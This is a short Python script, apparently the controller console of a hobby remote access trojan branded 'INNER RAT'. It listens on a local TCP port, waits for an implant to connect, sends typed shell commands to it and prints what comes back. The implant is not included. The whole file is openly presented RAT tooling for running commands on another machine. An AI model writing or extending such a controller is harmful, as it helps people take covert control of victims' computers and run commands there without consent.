# Importing required module
import socket # connection
import os # cls

HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
PORT = 65433  # Port to listen on (non-privileged ports are > 1023)
innerratthingy = """
 __  .__   __. .__   __.  _______ .______         .______          ___   .___________.
|  | |  \ |  | |  \ |  | |   ____||   _  \        |   _  \        /   \  |           |
|  | |   \|  | |   \|  | |  |__   |  |_)  |       |  |_)  |      /  ^  \ `---|  |----`
|  | |  . `  | |  . `  | |   __|  |      /        |      /      /  /_\  \    |  |     
|  | |  |\   | |  |\   | |  |____ |  |\  \----.   |  |\  \----./  _____  \   |  |     
|__| |__| \__| |__| \__| |_______|| _| `._____|   | _| `._____/__/     \__\  |__|     
                                                                                      
"""

# main program
os.system("cls")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    # weird connection stuff
    s.bind((HOST, PORT))
    s.listen()
    print(innerratthingy) #logo
    print("waiting for server to connect...")
    conn, addr = s.accept() # Important: Will stall here until server connects
    
    with conn:
        print(f"Connected by {addr}") # confirms it worked
        # command loop
        while True:
            command = input("$ ") # command input
            if command: # makes sure command isn't ""
                conn.sendall(bytes(command, 'utf-8'))
                data = conn.recv(1024).decode()
            if command == "bye": # allows console to quit
                break
            print(data)# prints output